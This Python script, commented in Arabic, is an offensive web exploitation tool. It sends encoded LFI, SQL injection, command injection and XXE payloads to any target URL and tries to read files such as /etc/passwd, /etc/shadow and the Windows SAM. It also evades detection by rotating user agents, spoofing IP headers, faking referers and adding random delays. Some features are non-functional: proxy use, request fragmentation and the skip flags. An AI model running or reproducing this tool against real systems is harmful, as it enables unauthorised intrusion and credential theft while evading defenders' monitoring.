#!/usr/bin/env python3

# Advanced Stealth Exploitation Tool
# أداة استغلال متقدمة مع ميزات التخفي وتخطي جدران الحماية

import sys
import json
import requests
import urllib3
import argparse
import time
import re
import random
import string
import base64
from urllib.parse import urljoin, urlparse, quote, unquote
from datetime import datetime
from fake_useragent import UserAgent
import socket

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class StealthExploiter:
    def __init__(self, target_url, timeout=15, stealth_level=3):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.stealth_level = stealth_level  # 1-5, 5 هو الأعلى
        self.session = requests.Session()
        self.session.verify = False
        
        # Initialize stealth features
        self.ua = UserAgent()
        self.exploitation_results = []
        self.start_time = datetime.now()
        self.request_count = 0
        
        # Configure stealth based on level
        self._configure_stealth()
    
    def _configure_stealth(self):
        """تهيئة إعدادات التخفي حسب المستوى"""
        if self.stealth_level >= 1:
            self.random_delays = True
            self.rotate_user_agents = True
        if self.stealth_level >= 2:
            self.use_proxies = True
            self.encode_payloads = True
        if self.stealth_level >= 3:
            self.mimic_human = True
            self.random_headers = True
        if self.stealth_level >= 4:
            self.fragment_requests = True
            self.chunked_encoding = True
        if self.stealth_level >= 5:
            self.use_tor = False  # يمكن تفعيله لاحقاً
            self.advanced_evasion = True
    
    def _rotate_identity(self):
        """تدوير الهوية"""
        if self.rotate_user_agents:
            user_agents = [
                self.ua.chrome,
                self.ua.firefox,
                self.ua.safari,
                self.ua.edge,
                # User agents أقل شيوعاً
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
            ]
            
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-US,en;q=0.9', 'ar-SA,ar;q=0.9,en;q=0.8']),
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            
            # إضافة هيدرز عشوائية
            if random.choice([True, False]):
                headers['X-Forwarded-For'] = self._generate_random_ip()
            if random.choice([True, False]):
                headers['X-Real-IP'] = self._generate_random_ip()
            if random.choice([True, False]):
                headers['Referer'] = self._generate_random_referer()
            if random.choice([True, False]):
                headers['X-HTTP-Method-Override'] = random.choice(['GET', 'POST', 'PUT'])
            
            self.session.headers.update(headers)
    
    def _generate_random_ip(self):
        """توليد IP عشوائي"""
        private_ips = [
            f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}",
            f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
        ]
        return random.choice(private_ips)
    
    def _generate_random_referer(self):
        """توليد Referer عشوائي"""
        referers = [
            'https://www.google.com/search?q=' + random.choice(['test', 'site:' + self.target_url, 'admin']),
            'https://www.bing.com/search?q=' + random.choice(['login', 'admin panel', 'site:' + self.target_url]),
            'https://search.yahoo.com/search?p=' + random.choice(['test', 'admin', 'login']),
            'https://duckduckgo.com/?q=' + random.choice(['site:' + self.target_url, 'admin', 'test']),
            f"https://{self.target_url}/",
            f"https://{self.target_url}/admin",
            f"https://{self.target_url}/login"
        ]
        return random.choice(referers)
    
    def _add_random_delay(self):
        """إضافة تأخير عشوائي"""
        if self.random_delays:
            # تأخيرات واقعية (0.5-5 ثواني)
            delay = random.uniform(0.5, 5.0)
            time.sleep(delay)
    
    def _encode_payload_advanced(self, payload, method='auto'):
        """ترميز متقدم للحمولة"""
        if method == 'auto':
            methods = ['url', 'double_url', 'base64', 'mixed', 'unicode', 'hex']
            method = random.choice(methods)
        
        if method == 'url':
            return quote(payload)
        elif method == 'double_url':
            return quote(quote(payload))
        elif method == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif method == 'mixed':
            # ترميز مختلط
            encoded = ""
            for char in payload:
                if char.isalnum():
                    encoded += char
                else:
                    encoded += quote(char) if random.choice([True, False]) else char
            return encoded
        elif method == 'unicode':
            # استخدام ترميز unicode
            unicode_map = {
                '/': '%u2215', '.': '%u002e', '\\': '%u2216',
                'a': '%u0061', 'e': '%u0065', 't': '%u0074',
                'c': '%u0063', 'p': '%u0070', 's': '%u0073',
                'o': '%u006f', 'r': '%u0072'
            }
            result = payload
            for char, uni in unicode_map.items():
                result = result.replace(char, uni)
            return result
        elif method == 'hex':
            return ''.join(f'%{ord(c):02x}' for c in payload)
        
        return payload
    
    def _fragment_request(self, payload, param):
        """تجزئة الطلب لتخطي الفلاتر"""
        if not self.fragment_requests:
            return None
        
        # تقسيم الحمولة إلى أجزاء
        chunk_size = len(payload) // random.randint(2, 4)
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        
        # إرسال الأجزاء في طلبات متعددة
        for i, chunk in enumerate(chunks):
            url = f"{self.target_url}/test?{param}={chunk}&chunk={i}"
            response = self._make_request('GET', url)
            if response:
                time.sleep(random.uniform(0.1, 0.5))
        
        # طلب نهائي لجمع النتائج
        final_url = f"{self.target_url}/test?{param}=final&chunks={len(chunks)}"
        return self._make_request('GET', final_url)
    
    def _make_request(self, method, url, **kwargs):
        """إجراء طلب مع ميزات التخفي"""
        self._rotate_identity()
        self._add_random_delay()
        self.request_count += 1
        
        # إضافة خيارات متقدمة
        if self.chunked_encoding:
            kwargs['headers'] = kwargs.get('headers', {})
            kwargs['headers']['Transfer-Encoding'] = 'chunked'
        
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, timeout=self.timeout, **kwargs)
            elif method.upper() == 'POST':
                response = self.session.post(url, timeout=self.timeout, **kwargs)
            else:
                response = self.session.request(method, url, timeout=self.timeout, **kwargs)
            
            return response
            
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            return None
    
    def add_exploitation_result(self, vulnerability, success, details, payload_used):
        result = {
            'vulnerability': vulnerability,
            'success': success,
            'details': details,
            'payload_used': payload_used,
            'timestamp': datetime.now().isoformat(),
            'stealth_level': self.stealth_level,
            'request_count': self.request_count
        }
        self.exploitation_results.append(result)
        
        status = "✅" if success else "❌"
        print(f"{status} {vulnerability}: {details}")
    
    def stealth_lfi_exploitation(self):
        """استغلال LFI مع تقنيات تخفي"""
        print("[*] Starting stealth LFI exploitation...")
        
        # مجموعة متنوعة من حمولات LFI
        lfi_payloads = [
            # أساسية
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            
            # متقدمة
            "....//....//....//etc/passwd",
            "..///////..///////..///////etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252fetc%252fpasswd",
            
            # ترميزات مختلفة
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            
            # حمولات Unicode
            "%u2215%u0065%u0074%u0063%u2215%u0070%u0061%u0073%u0073%u0077%u0064",
            
            # حمولات Base64
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "expect://id",
            "input://echo 'test'",
            
            # حمولات متقدمة
            "php://input",
            "php://output",
            "php://filter/read=string.rot13/resource=index.php",
            "php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php",
            
            # محاولة الوصول إلى ملفات مختلفة
            "../../../../windows/system32/drivers/etc/hosts",
            "../../../../windows/system32/config/sam",
            "../../../../windows/system32/config/system",
            "../../../../windows/win.ini",
            "../../../../apache/logs/access.log",
            "../../../../apache/logs/error.log",
            "../../../../var/log/apache2/access.log",
            "../../../../var/log/apache2/error.log",
            "../../../../var/log/nginx/access.log",
            "../../../../var/log/nginx/error.log",
            "../../../../etc/shadow",
            "../../../../etc/hosts",
            "../../../../etc/group",
            "../../../../proc/self/environ",
            "../../../../proc/version",
            "../../../../proc/cmdline"
        ]
        
        # معلمات مختلفة
        params = ['file', 'page', 'include', 'template', 'path', 'document', 'dir', 'folder']
        
        success_count = 0
        
        for param in params:
            for payload in lfi_payloads:
                # استخدام تقنيات ترميز مختلفة
                encoding_methods = ['url', 'double_url', 'mixed', 'unicode', 'hex']
                
                for method in encoding_methods:
                    encoded_payload = self._encode_payload_advanced(payload, method)
                    
                    # بناء روابط مختلفة
                    urls = [
                        f"{self.target_url}/test?{param}={encoded_payload}",
                        f"{self.target_url}/include?{param}={encoded_payload}",
                        f"{self.target_url}/page?{param}={encoded_payload}",
                        f"{self.target_url}/file?{param}={encoded_payload}",
                        f"{self.target_url}/?{param}={encoded_payload}"
                    ]
                    
                    for url in urls:
                        response = self._make_request('GET', url)
                        
                        if response:
                            # التحقق من مؤشرات النجاح
                            success_indicators = [
                                'root:x:', 'daemon:', 'bin:x:', 'sys:x:',
                                'Administrator', 'Windows', 'localhost',
                                'PD9waH', 'base64', 'uid=', 'gid=',
                                '# /etc/hosts', '# localhost', '127.0.0.1'
                            ]
                            
                            for indicator in success_indicators:
                                if indicator in response.text:
                                    self.add_exploitation_result(
                                        "LFI - Stealth Exploitation",
                                        True,
                                        f"Successfully accessed {indicator} using {method} encoding",
                                        f"{param}={encoded_payload}"
                                    )
                                    success_count += 1
                                    
                                    # حفظ النتائج
                                    filename = f"lfi_result_{int(time.time())}.txt"
                                    with open(filename, 'w', encoding='utf-8') as f:
                                        f.write(f"URL: {url}\n")
                                        f.write(f"Payload: {encoded_payload}\n")
                                        f.write(f"Response:\n{response.text}\n")
                                    
                                    print(f"[+] Results saved to {filename}")
                                    return
        
        if success_count == 0:
            self.add_exploitation_result(
                "LFI - Stealth Exploitation",
                False,
                "No successful LFI exploitation found",
                "Various payloads and encoding methods tried"
            )
    
    def stealth_sql_injection_exploitation(self):
        """استغلال SQL Injection مع تقنيات تخفي"""
        print("[*] Starting stealth SQL injection exploitation...")
        
        # حمولات SQL Injection المتقدمة
        sql_payloads = [
            # اختبار Basic
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            
            # اختبار Union
            "' UNION SELECT null--",
            "' UNION SELECT null,null--",
            "' UNION SELECT null,null,null--",
            
            # اختبار Time-based
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "' OR WAITFOR DELAY '0:0:5'--",
            
            # تخطي الفلاتر
            "'/**/OR/**/1=1#",
            "'/**/OR/**/1=1--",
            "' OR 1=1-- -",
            "' OR '1'='1' /*",
            
            # حمولات متقدمة
            "admin'--",
            "admin' #",
            "admin'/*",
            "admin' or '1'='1'--",
            "admin' or '1'='1'#",
            
            # محاولة استخراج البيانات
            "' UNION SELECT database()--",
            "' UNION SELECT user()--",
            "' UNION SELECT version()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--"
        ]
        
        params = ['id', 'user', 'name', 'email', 'search', 'q', 'page', 'cat', 'product']
        
        for param in params:
            for payload in sql_payloads:
                # ترميز مختلف
                encoding_methods = ['url', 'mixed', 'unicode']
                
                for method in encoding_methods:
                    encoded_payload = self._encode_payload_advanced(payload, method)
                    
                    # طلبات GET و POST
                    get_url = f"{self.target_url}/test?{param}={encoded_payload}"
                    
                    # GET request
                    response = self._make_request('GET', get_url)
                    
                    if response:
                        # التحقق من أخطاء SQL
                        sql_errors = [
                            'mysql_fetch_array', 'mysql_fetch_assoc', 'mysql_num_rows',
                            'ORA-', 'Oracle error', 'Oracle driver', 'PostgreSQL',
                            'Warning: mysql', 'Warning: pg_', 'Microsoft OLE DB',
                            'SQLServer JDBC Driver', 'SqlException', 'SQLite',
                            'mysql_error', 'mysql_errno', 'pg_error', 'pg_errno',
                            'sqlstate', 'syntax error', 'unexpected end of SQL',
                            'unterminated quoted string', 'quoted string not properly terminated'
                        ]
                        
                        for error in sql_errors:
                            if error.lower() in response.text.lower():
                                self.add_exploitation_result(
                                    "SQL Injection - Stealth",
                                    True,
                                    f"SQL error detected: {error}",
                                    f"{param}={encoded_payload}"
                                )
                                return
                        
                        # اختبار Time-based
                        start_time = time.time()
                        time_response = self._make_request('GET', get_url)
                        end_time = time.time()
                        
                        if time_response and (end_time - start_time) > 4.5:  # أكثر من 4.5 ثانية
                            self.add_exploitation_result(
                                "SQL Injection - Time Based",
                                True,
                                f"Time-based SQL injection detected (delay: {end_time - start_time:.2f}s)",
                                f"{param}={encoded_payload}"
                            )
                            return
    
    def stealth_command_injection(self):
        """استغلال Command Injection مع التخفي"""
        print("[*] Starting stealth command injection exploitation...")
        
        command_payloads = [
            # Basic
            "; id",
            "| id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            
            # متقدمة
            "; whoami",
            "| whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",
            
            # تخطي الفلاتر
            "; /bin/id",
            "| /usr/bin/id",
            "; /usr/bin/whoami",
            
            # Base64 encoding
            "; echo $(echo 'aWQ=' | base64 -d)",
            "; echo $(echo 'd2hvYW1p' | base64 -d)",
            
            # متغيرات
            "; a=id; $a",
            "; a=whoami; $a",
            
            # Using printf
            "; printf 'id' | sh",
            "; printf 'whoami' | sh"
        ]
        
        params = ['cmd', 'command', 'exec', 'run', 'system', 'shell', 'input']
        
        for param in params:
            for payload in command_payloads:
                encoded_payload = self._encode_payload_advanced(payload, 'mixed')
                
                urls = [
                    f"{self.target_url}/test?{param}={encoded_payload}",
                    f"{self.target_url}/exec?{param}={encoded_payload}",
                    f"{self.target_url}/command?{param}={encoded_payload}"
                ]
                
                for url in urls:
                    response = self._make_request('GET', url)
                    
                    if response:
                        # التحقق من مؤشرات تنفيذ الأمر
                        indicators = [
                            'uid=', 'gid=', 'groups=',
                            'root', 'www-data', 'apache', 'nginx',
                            'Windows', 'Microsoft', 'Administrator',
                            'Command executed', 'Output:'
                        ]
                        
                        for indicator in indicators:
                            if indicator in response.text:
                                self.add_exploitation_result(
                                    "Command Injection - Stealth",
                                    True,
                                    f"Command execution detected: {indicator}",
                                    f"{param}={encoded_payload}"
                                )
                                return
    
    def stealth_xxe_exploitation(self):
        """استغلال XXE مع التخفي"""
        print("[*] Starting stealth XXE exploitation...")
        
        xxe_payloads = [
            {
                'name': 'Basic XXE',
                'payload': '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''
            },
            {
                'name': 'Windows XXE',
                'payload': '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>'''
            },
            {
                'name': 'PHP Filter XXE',
                'payload': '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>'''
            },
            {
                'name': 'Advanced XXE',
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<data></data>'''
            }
        ]
        
        headers_list = [
            {'Content-Type': 'application/xml'},
            {'Content-Type': 'text/xml'},
            {'Content-Type': 'application/xml; charset=utf-8'},
            {'Content-Type': 'text/xml; charset=utf-8'},
            {'Content-Type': 'application/xml;charset=UTF-8'},
            {'Content-Type': 'application/x-xml'}
        ]
        
        for xxe_data in xxe_payloads:
            for headers in headers_list:
                # POST request
                response = self._make_request('POST', f"{self.target_url}/xml", 
                                            data=xxe_data['payload'], headers=headers)
                
                if response:
                    # التحقق من مؤشرات XXE
                    indicators = [
                        'root:x:', 'daemon:', 'bin:x:',
                        'for 16-bit app support', '[fonts]', '[extensions]',
                        'PD9waH', 'base64', 'uid=', 'gid='
                    ]
                    
                    for indicator in indicators:
                        if indicator in response.text:
                            self.add_exploitation_result(
                                f"XXE - {xxe_data['name']}",
                                True,
                                f"XXE exploitation successful: {indicator}",
                                xxe_data['payload']
                            )
                            return
    
    def run_stealth_exploitation(self):
        """تشغيل الاستغلال الكامل مع التخفي"""
        print(f"[*] Starting stealth exploitation for {self.target_url}")
        print(f"[*] Stealth level: {self.stealth_level}/5")
        print(f"[*] Features enabled: {self._get_enabled_features()}")
        
        # تشغيل جميع اختبارات الاستغلال
        self.stealth_lfi_exploitation()
        self.stealth_sql_injection_exploitation()
        self.stealth_command_injection()
        self.stealth_xxe_exploitation()
        
        # إنشاء التقرير النهائي
        self.generate_stealth_exploitation_report()
    
    def _get_enabled_features(self):
        """الحصول على الميزات المفعلة"""
        features = []
        if hasattr(self, 'random_delays') and self.random_delays:
            features.append("Random Delays")
        if hasattr(self, 'rotate_user_agents') and self.rotate_user_agents:
            features.append("UA Rotation")
        if hasattr(self, 'encode_payloads') and self.encode_payloads:
            features.append("Payload Encoding")
        if hasattr(self, 'mimic_human') and self.mimic_human:
            features.append("Human Mimicry")
        return ", ".join(features) if features else "None"
    
    def generate_stealth_exploitation_report(self):
        """توليد تقرير الاستغلال المتخفي"""
        report = {
            'exploitation_type': 'stealth_exploitation',
            'target_url': self.target_url,
            'start_time': self.start_time.isoformat(),
            'end_time': datetime.now().isoformat(),
            'total_requests': self.request_count,
            'stealth_configuration': {
                'stealth_level': self.stealth_level,
                'features_enabled': self._get_enabled_features(),
                'timeout': self.timeout
            },
            'exploitation_results': self.exploitation_results,
            'success_summary': {
                'total_successful': len([r for r in self.exploitation_results if r['success']]),
                'total_failed': len([r for r in self.exploitation_results if not r['success']]),
                'by_vulnerability': {}
            }
        }
        
        # تجميع النتائج حسب نوع الثغرة
        for result in self.exploitation_results:
            vuln_type = result['vulnerability']
            if vuln_type not in report['success_summary']['by_vulnerability']:
                report['success_summary']['by_vulnerability'][vuln_type] = {
                    'successful': 0,
                    'failed': 0
                }
            
            if result['success']:
                report['success_summary']['by_vulnerability'][vuln_type]['successful'] += 1
            else:
                report['success_summary']['by_vulnerability'][vuln_type]['failed'] += 1
        
        # حفظ التقرير
        filename = f"stealth_exploitation_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] Stealth exploitation report saved to {filename}")
        print(f"[+] Total requests made: {self.request_count}")
        print(f"[+] Successful exploitations: {report['success_summary']['total_successful']}")
        print(f"[+] Failed exploitations: {report['success_summary']['total_failed']}")
        
        return filename

def main():
    parser = argparse.ArgumentParser(description='Advanced Stealth Exploitation Tool')
    parser.add_argument('target', help='Target URL to exploit')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout (default: 15)')
    parser.add_argument('--stealth-level', type=int, choices=range(1, 6), default=3,
                       help='Stealth level 1-5 (default: 3)')
    parser.add_argument('--skip-lfi', action='store_true', help='Skip LFI exploitation')
    parser.add_argument('--skip-sql', action='store_true', help='Skip SQL injection exploitation')
    parser.add_argument('--skip-cmd', action='store_true', help='Skip command injection exploitation')
    parser.add_argument('--skip-xxe', action='store_true', help='Skip XXE exploitation')
    
    args = parser.parse_args()
    
    exploiter = StealthExploiter(
        target_url=args.target,
        timeout=args.timeout,
        stealth_level=args.stealth_level
    )
    
    try:
        exploiter.run_stealth_exploitation()
    except KeyboardInterrupt:
        print("\n[!] Exploitation interrupted by user")
        exploiter.generate_stealth_exploitation_report()
        sys.exit(1)

if __name__ == "__main__":
    main()